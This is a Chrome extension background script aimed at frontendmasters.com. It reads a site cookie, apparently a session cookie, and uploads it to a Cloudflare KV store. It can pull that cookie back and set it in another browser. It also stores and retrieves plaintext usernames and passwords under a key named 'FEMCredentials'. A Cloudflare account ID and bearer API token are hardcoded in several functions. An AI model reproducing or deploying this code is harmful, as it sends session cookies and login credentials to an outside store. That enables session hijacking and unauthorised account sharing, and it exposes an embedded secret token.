console.log("Background script loading");

// Function to save a cookie to Cloudflare KV
function saveCookieToCloudflareKV(cookieValue) {
  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "9bf25b63071e43b6a2a92b8aef6a64cf";
  const key = "FEMC";
  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/${key}`;
  const headers = {
    "Content-Type": "application/json",
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  fetch(url, {
    method: "PUT",
    headers: headers,
    body: cookieValue,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      console.log("Response received from Cloudflare KV:", response);
      return response.text();
    })
    .then((data) => {
      console.log("Cookie value saved to Cloudflare KV:", data);
    })
    .catch((error) => {
      console.error("Error saving cookie value to Cloudflare KV:", error);
    });
}

// Function to apply cookies from Cloudflare KV
function applyCookiesFromCloudFlare(sendResponse) {
  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "9bf25b63071e43b6a2a92b8aef6a64cf";
  const key = "FEMC";
  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/${key}`;
  const headers = {
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  fetch(url, {
    method: "GET",
    headers: headers,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then((cookieDetails) => {
      chrome.cookies.set(
        {
          url: `https://www.frontendmasters.com`,
          name: cookieDetails.name,
          value: cookieDetails.value,
          domain: cookieDetails.domain,
          path: cookieDetails.path,
          secure: cookieDetails.secure,
          httpOnly: cookieDetails.httpOnly,
          expirationDate: cookieDetails.expirationDate,
          sameSite:
            cookieDetails.sameSite === "unspecified"
              ? "no_restriction"
              : cookieDetails.sameSite,
        },
        (cookie) => {
          if (chrome.runtime.lastError) {
            console.error("Error setting cookie:", chrome.runtime.lastError);
            sendResponse({
              success: false,
              error: chrome.runtime.lastError.message,
            });
            return;
          }
          console.log("Cookie set successfully:", cookie);
          sendResponse({ success: true });
        }
      );
    })
    .catch((error) => {
      console.error("Error retrieving or setting cookie:", error);
      sendResponse({ success: false, error: error.message });
    });

  return true; // Keep the sendResponse callback valid
}

// Listener for messages from the content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log("Message received:", message);

  if (message.action === "getCookie") {
    console.log(`Fetching cookie with name: ${message.name}`);
    chrome.cookies.get(
      { url: "https://www.frontendmasters.com/", name: message.name },
      (cookie) => {
        if (cookie) {
          console.log("Cookie found:", cookie);
          sendResponse({ cookie });
          saveCookieToCloudflareKV(JSON.stringify(cookie));
        } else {
          console.log("Cookie not found");
          sendResponse({ error: "Cookie not found" });
        }
      }
    );
  } else if (message.action === "applyCookiesFromCloudFlare") {
    applyCookiesFromCloudFlare(sendResponse);
  } else if (message.action === "saveCredentials") {
    console.log("Initiating credentials save to Cloudflare KV.");
    const credentials =
      typeof message.credentials === "string"
        ? JSON.parse(message.credentials)
        : message.credentials;
    saveCredentialsToCloudflareKV(credentials);
    sendResponse({ status: "Credentials saving process initiated" });
  } else if (message.action === "fetchCredentialsFromCloudflare") {
    // Corrected the action name
    console.log("Fetching credentials from Cloudflare KV.");
    fetchCredentialsFromCloudflare()
      .then((credentials) => {
        if (credentials) {
          console.log("Credentials fetched from Cloudflare KV:", credentials);
          sendResponse({ success: true, credentials });
        } else {
          console.log("Credentials not found in Cloudflare KV");
          sendResponse({ success: false, error: "Credentials not found" });
        }
      })
      .catch((error) => {
        console.error("Error fetching credentials from Cloudflare KV:", error);
        sendResponse({ success: false, error: error.message });
      });
  } else {
    console.log("Unknown action received:", message.action);
    sendResponse({ error: "Unknown action" });
  }

  return true; // Indicates an asynchronous response
});

// Function to save credentials to Cloudflare KV
function saveCredentialsToCloudflareKV(credentials) {
  // Check for empty strings in credentials
  if (
    !credentials ||
    credentials.username === "" ||
    credentials.password === ""
  ) {
    console.error("Error: Credentials are empty, not saving to Cloudflare KV.");
    return;
  }

  console.log("Received credentials to save:", credentials);
  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "75170ed64f4d4c9b9525de367132e4ad";
  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/FEMCredentials`;
  const headers = {
    "Content-Type": "application/json",
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  const body = JSON.stringify(credentials);

  console.log(
    "Sending PUT request to Cloudflare KV with the following body:",
    body
  );

  fetch(url, {
    method: "PUT",
    headers: headers,
    body: body,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      console.log("Response status:", response.status);
      return response.text();
    })
    .then((data) => {
      console.log(
        "Credentials saved to Cloudflare KV. Response from Cloudflare:",
        data
      );
      // Optionally clear credentials after save
      chrome.storage.local.remove("tempCredentials");
    })
    .catch((error) => {
      console.error("Error saving credentials to Cloudflare KV:", error);
    });
}

// Function to fetch credentials from Cloudflare KV
function fetchCredentialsFromCloudflare() {
  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "75170ed64f4d4c9b9525de367132e4ad";
  const key = "FEMCredentials";
  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/${key}`;
  const headers = {
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  return fetch(url, {
    method: "GET",
    headers: headers,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.text(); // Changed from response.json() as the data appears to be in string format
    })
    .then((text) => {
      try {
        const data = JSON.parse(text); // Parse the JSON string manually
        if (data) {
          // console.log("Credentials fetched successfully:", data);
          return data; // Return the parsed credentials
        } else {
          console.log("No credentials found in the response.");
          return null;
        }
      } catch (error) {
        console.error("Error parsing credentials JSON:", error);
        throw error;
      }
    })
    .catch((error) => {
      console.error("Error fetching credentials from Cloudflare KV:", error);
      throw error;
    });
}

console.log("Background script loaded");
